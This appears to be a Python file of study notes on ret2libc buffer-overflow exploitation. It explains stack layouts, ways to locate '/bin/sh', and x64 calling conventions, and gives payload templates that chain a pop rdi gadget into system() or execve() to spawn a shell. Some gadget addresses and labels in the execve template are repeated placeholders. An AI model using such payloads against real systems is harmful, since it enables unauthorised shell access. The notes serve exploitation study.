#!/usr/bin/env python

#https://www.shellblade.net/docs/ret2libc.pdf


#https://pastebin.com/RA4qVWgX

#https://www.pwnthebox.net/

'''
TLDR; You want to overflow the buffer so the program returns to system and executes the address of where "/bin/sh" is stored in memory
USED ON NX

ANATOMY:

x32 --> [Fill the stack frame][Fill ebp with 4 bytes][address of system()][address of exit()][address of "/bin/sh" string]
x64 --? [fill the stack frame][fill ebp with 8 bytes][pop ret gadget][addr of /bin/sh][addr of system]

!!If you cant isolate the "/bin/sh" string using the addresses
0xbffffe4a: "EGG=/bin/sh"
EGG= is 4 bytes --> 4 + 0xbffffe4a = the address you want for "/bin/sh"

You can also use a /bin/sh SLED by --> ///////.../bin/sh into the stack space
Or just write it to the stack as "/bin/sh"
'''

'''
In 32-bit binaries, a ret2libc attack involves setting up a fake stack frame so that the function
calls a function in libc and passes it any parameters it needs. Typically this would be returning to system() and having it execute “/bin/sh”.

In 64-bit binaries, function parameters are passed in registers, therefore there’s no need to fake a stack frame.
The first six parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9. Anything future is stack pushed

find "/bin/sh" to search the binary for the string in gdb

SYSTEM ONLY REQUIRES 1 ARG FROM RDI ON 64 BIT
buf = ""
buf += "A"*104                              # junk
buf += pack("<Q", 0x00000000004006a3)       # pop rdi; ret;
buf += pack("<Q", 0x4006ff)                 # pointer to "/bin/sh" gets popped into rdi
buf += pack("<Q", 0x7ffff7a5ac40)           # address of system()

EXECVE() REQURIRES 3 ARG FROM RDI, RSI, RDX
buf = ""
buf += "A"*104                              # junk
buf += pack("<Q", 0x00000000004006a3)       # pop rdi; ret;
buf += pack("<Q", 0x4006ff)                 # pointer to "/bin/sh" gets popped into rdi

buf += pack("<Q", 0x00000000004006a3)       # pop rsi; ret; <- Also could be a double pop
buf += pack("<Q", 0x4006ff)                 # "BBBB" <-- fill rsi

buf += pack("<Q", 0x00000000004006a3)       # pop rdx; ret;
buf += pack("<Q", 0x4006ff)                 # "CCCC"
buf += pack("<Q", 0x7ffff7a5ac80)           # address of execve()
'''
